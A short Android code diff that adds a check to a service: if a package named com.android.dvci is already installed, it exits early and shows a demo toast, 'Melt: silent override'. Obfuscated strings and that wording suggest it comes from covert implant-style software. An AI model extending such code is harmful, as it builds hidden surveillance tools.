@@ -16,6 +16,7 @@ import com.android.dvci.listener.BSm;
 import com.android.dvci.listener.BSt;
 import com.android.dvci.listener.WR;
 import com.android.dvci.util.Check;
+import com.android.dvci.util.PackageUtils;
 import com.android.mm.M;
 
 /**
@@ -54,6 +55,14 @@ public class ServiceMain extends Service {
 		        Status.self().makeToast(M.e("RUNNING"));
 	        }
 
+            return;
+        }
+
+        String dvci = M.e("com.android.dvci");
+        if (PackageUtils.isInstalledApk(dvci)) {
+            if (Cfg.DEMO) {
+                Status.self().makeToast(M.e("Melt: silent override"));
+            }
             return;
         }
 
